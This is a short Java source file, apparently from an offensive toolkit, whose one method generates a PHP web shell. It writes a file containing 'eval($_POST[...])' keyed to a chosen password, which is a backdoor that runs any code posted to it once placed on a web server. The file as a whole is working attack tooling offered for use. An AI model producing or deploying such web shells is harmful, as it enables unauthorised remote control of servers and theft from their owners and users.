package com.atlant1c.generate;

import java.io.FileWriter;
import java.io.IOException;

public class Php {
    public static void generatePayload(String pass, String filePath) {
        String content = "<?php\neval($_POST[\"" + pass + "\"]);";
        try (FileWriter writer = new FileWriter(filePath)) {
            writer.write(content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
